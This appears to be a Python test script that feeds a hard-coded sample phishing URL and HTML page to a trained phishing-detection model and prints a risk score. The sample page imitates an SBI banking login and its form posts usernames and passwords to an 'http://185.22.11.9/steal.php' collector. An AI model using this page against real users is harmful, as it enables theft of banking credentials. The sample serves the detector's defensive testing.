import joblib
import pandas as pd
from backend.extractor import extract_features

# Load the brain you just trained
model = joblib.load("backend/model.pkl")

sample_phish_url = "http://login.secure-update.sbi-verify.top/auth99821.php"
sample_phish_html = """
<!DOCTYPE html>
<html>
<head><title>SBI Corporate Banking</title></head>
<body>
    <form action="http://185.22.11.9/steal.php" method="POST">
        <input type="text" name="user">
        <input type="PaSsWoRd" name="pass">
        <input type="hidden" name="session_id" value="99123">
        <button type="SUBMIT">Login</button>
    </form>
    <iframe src="http://tracker.ru/pixel"></iframe>
    <a href="https://onlinesbi.sbi/terms">Terms</a>
    <a href="https://onlinesbi.sbi/privacy">Privacy</a>
</body>
</html>
"""

# 1. Extract dictionary of 14 features
features = extract_features(sample_phish_url, sample_phish_html)

# 2. Convert dictionary into a 1-row Pandas DataFrame
df_input = pd.DataFrame([features])

# 3. Get the Phishing Risk Score
phish_probability = model.predict_proba(df_input)[0][1]
print(f"Phishing Risk Score: {phish_probability * 100:.2f}%")
